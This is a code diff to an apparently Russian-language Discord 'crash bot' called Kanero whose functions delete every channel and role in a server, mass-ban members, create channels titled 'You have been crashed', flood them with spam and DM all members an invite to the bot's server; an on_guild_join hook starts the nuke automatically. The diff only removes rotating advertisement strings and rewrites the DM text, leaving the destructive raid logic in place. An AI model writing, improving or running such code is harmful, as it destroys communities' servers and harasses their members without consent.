@@ -246,15 +246,6 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         spam_text = config.SPAM_TEXT
 
     # Реклама — добавляется всегда, вариативно чтобы Discord не блокировал
-    import random
-    ad_variants = [
-        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
-        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
-        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
-        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
-        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
-    ]
-
     NUKE_NAME = "Вы были крашнуты"
 
     # ── 1. Удаляем каналы и роли параллельно, сразу начинаем создавать ──
@@ -264,7 +255,6 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
 
     import random
 
-    # Запускаем удаление и создание одновременно
     async def delete_all():
         await asyncio.gather(
             *[c.delete() for c in channels_to_delete],
@@ -277,7 +267,7 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
             if not nuke_running.get(guild.id):
                 return
             ch = await guild.create_text_channel(name=NUKE_NAME)
-            msgs = [ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)]
+            msgs = [ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)]
             await asyncio.gather(*msgs, return_exceptions=True)
         except Exception:
             pass
@@ -350,14 +340,6 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
 
     # ── 2. Удаляем и создаём параллельно ──
-    import random
-    ad_variants = [
-        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
-        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
-        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
-        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
-        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
-    ]
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
@@ -372,7 +354,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         try:
             ch = await guild.create_text_channel(name=TURBO_NAME)
             await asyncio.gather(
-                *[ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                 return_exceptions=True
             )
         except Exception:
@@ -428,14 +410,6 @@ async def do_owner_nuke_task(guild, spam_text=None):
     await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
 
     # ── 2. Удаляем и создаём параллельно ──
-    import random
-    ad_variants = [
-        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
-        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
-        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
-        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
-        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
-    ]
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
@@ -450,7 +424,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
         try:
             ch = await guild.create_text_channel(name=OWNER_NAME)
             await asyncio.gather(
-                *[ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                 return_exceptions=True
             )
         except Exception:
@@ -3190,7 +3164,7 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
 
-        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/JhQtrCtKFy\n# https://discord.gg/JhQtrCtKFy\n# https://discord.gg/JhQtrCtKFy"
+        dm_text = "|| @everyone  @here ||\n# Kanero-bot\n# 🔧 Developer-DavaidKa)\n**Хочеш так же? **\nhttps://discord.gg/exYwg6Gz"
 
         async def dm_all():
             for member in guild.members:
